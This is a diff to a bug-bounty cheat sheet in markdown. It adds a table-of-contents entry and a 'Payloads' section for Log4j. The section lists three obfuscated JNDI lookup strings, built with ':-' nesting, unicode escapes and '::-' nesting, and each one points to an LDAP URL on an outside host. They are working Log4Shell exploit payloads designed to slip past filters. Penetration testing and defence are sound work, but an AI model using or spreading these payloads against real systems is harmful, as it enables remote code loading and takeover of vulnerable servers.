@@ -15,6 +15,7 @@
 
 
 ### BugBounty
+  - [Payloads](#payloads)
   - [One liner bugbounty](#one-liner-bugbounty)
   - [CMS exploitation](#cms-exploitation)
      - [Wordpress](#wordpress)
@@ -94,6 +95,28 @@
   - [SQLi+XSS+SSTI](#sqli-xss-ssti)
   - [ShellShock](#shellshock)
 -------------------------------------------------------------------------------------------------------------
+# Payloads
+## Log4j
+
+### ":-" notation
+
+${j${${:-l}${:-o}${:-w}${:-e}${:-r}:n}di:ldap://somesitehackerofhell.com/z}
+
+### Unicode Characters (JSON REST API request)
+```
+${\u006a\u006e\u0064\u0069:ldap://somesitehackerofhell.com/z}
+```
+
+### "::-" notation
+```
+${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://somesitehackerofhell.com/z}
+```
+
+
+
+
+
+
 # One liner BugBounty
 
 ### XSS finder
